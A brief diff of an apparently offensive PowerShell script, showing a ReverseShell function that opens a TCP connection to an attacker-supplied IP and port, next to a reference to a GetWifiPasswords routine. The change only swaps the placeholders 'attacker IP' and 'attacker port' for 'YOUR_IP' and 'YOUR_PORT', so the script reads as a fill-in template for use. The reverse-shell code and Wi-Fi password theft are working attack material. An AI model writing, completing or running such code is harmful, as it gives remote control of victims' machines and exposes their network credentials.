@@ -101,8 +101,8 @@ GetWifiPasswords
 
 # Reverse shell
 function ReverseShell {
-    $ip = 'attacker IP'
-    $port = 'attacker port'
+    $ip = 'YOUR_IP'
+    $port = 'YOUR_PORT'
 
     $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
     $stream = $client.GetStream()
